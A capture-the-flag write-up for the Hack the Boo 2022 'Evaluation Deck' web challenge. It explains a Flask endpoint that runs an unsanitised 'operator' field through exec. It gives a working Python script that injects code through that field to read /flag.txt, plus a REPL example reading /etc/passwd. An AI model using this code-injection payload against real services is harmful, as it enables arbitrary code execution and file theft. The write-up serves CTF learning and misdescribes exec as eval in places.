# Evaluation Deck
Hack the Boo 2022

## Description

```
A powerful demon has sent one of his ghost generals into our world to ruin the fun of Halloween. 
The ghost can only be defeated by luck. Are you lucky enough to draw the right cards to defeat him and save this Halloween?
```

## Challenge Explanation

For this challenge, we get a webpage as well as the backend source code for the web server.

The Dockerfile for the web server shows that a file called `flag.txt` was placed in the root directory of the web server when it was containerized, so our goal will likely be to read that file on the victim's machine.

## The Vulnerability

The web server for this challenge is running using Flask, a lightweight Python framework for building websites. There are all of the basic files that you'd expect from a Flask server, setting up templates and routes.

It looks like whenever we flip a card in the game, the application sends an API request to the server to run the calculations for the damage we do to the enemy. This behaviour is defined in `routes.py`:

```python
from flask import Blueprint, render_template, request
from application.util import response

web = Blueprint('web', __name__)
api = Blueprint('api', __name__)

@web.route('/')
def index():
    return render_template('index.html')

@api.route('/get_health', methods=['POST'])
def count():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()

    current_health = data.get('current_health')
    attack_power = data.get('attack_power')
    operator = data.get('operator')
    
    if not current_health or not attack_power or not operator:
        return response('All fields are required!'), 400

    result = {}
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

We can see that when you hit the `/get_health` endpoint, the server takes three parameters, `current_health`, `attack_power`, and `operator`, then uses them to calculate the enemy's new health.

However, it's doing these calculations using Python's `eval` function. This function can take strings and arguments, and interpret them as mathematical symbols. For example:

```
Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> equation = "2 + 5"
>>> eval(equation)
7
>>> 
```

However, `eval` is not limited just to doing simple math problems. It actually interprets the string as code, which means that you can use it to run other Python statements. Here's an example using `eval` to read the contents of `/etc/passwd`:

```
Python 3.8.10 (default, Jun 22 2022, 20:18:18) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> equation = "open('/etc/passwd').read()"
>>> eval(equation)
'root:x:0:0:root:/root:/bin/bash\ndaemon: ...
...
...
...
>>>
```

This is super dangerous. Because the web server is using `eval`, we essentially have a pathway to arbitrary code execution.

## The Solution

### Solution Overview

The goal here is to carefully craft values for `current_health`, `operator`, and `attack_power` so that we can exploit this part of the code:

```python
    try:
        code = compile(f'result = {int(current_health)} {operator} {int(attack_power)}', '<string>', 'exec')
        exec(code, result)
        return response(result.get('result'))
    except:
        return response('Something Went Wrong!'), 500
```

I noticed that both `current_health` and `attack_power` were being cast to integers, so I figured that it would be a good starting place to find a way to convert the contents of `flag.txt` into an int. I wrote a line of code that would open the `flag.txt` file and read it. Then it would take each character in the file, convert it to its ASCII value, and concatenate it. This should give us one huge int that represents the entire flag as ASCII:

```
ascii_flag = ''.join(str(ord(char)) for char in open('/flag.txt', 'r').read())

```
The easiest thing to do would be to send this as the `current_health` parameter. Then, I could send `+` for the operator, and `1` for the `attack_power`. Hopefully, the server will end up sending me back `ascii_flag + 1`, which I could then convert back into text.

However, it wasn't quite this simple. Python was trying to convert the actual string `"''.join(str(ord(char)) for char in open('/flag.txt', 'r').read())"` as an int, which obviously didn't go great. Time to tweak the exploit.

The `operator` field isn't converted to an `int`, so I decided to move my payload into there. This was slightly more complex, becasuse it requires you to figure out how the `operator` field would interact with the arguments on either side of it:

```
operator="""+ int(''.join(str(ord(c)) for c in open('/flag.txt', 'r').read())) +"""

```

Now, we can set both `current_health` and `attack_power` to be 1, and the server will run `1 + ascii_flag + 1`. Note that they can't be 0, because that will fail this check in the source code:
```python
if not current_health or not attack_power or not operator:
    return response('All fields are required!'), 400
```

### Implementation

Here is the full exploit, in Python:

```python
import requests

current_health=1
operator="""+ int(''.join(str(ord(c)) for c in open('/flag.txt', 'r').read())) +"""
attack_power=1

payload={"current_health":current_health, "operator":operator, "attack_power":attack_power}


target="http://167.99.202.139:30194/api/get_health"

p = requests.post(target, json=payload)
print(p.text)
```

When we run it, we get back a big number as `p.text`. I could have written some code to transform this back into ASCII characters, but it was easier to just subtract 2 and toss it into an online converter like Cyberchef. Here's what you get:

```
HTB{c0d3_1nj3ct10ns_4r3_Gr3at!!}
```
Success!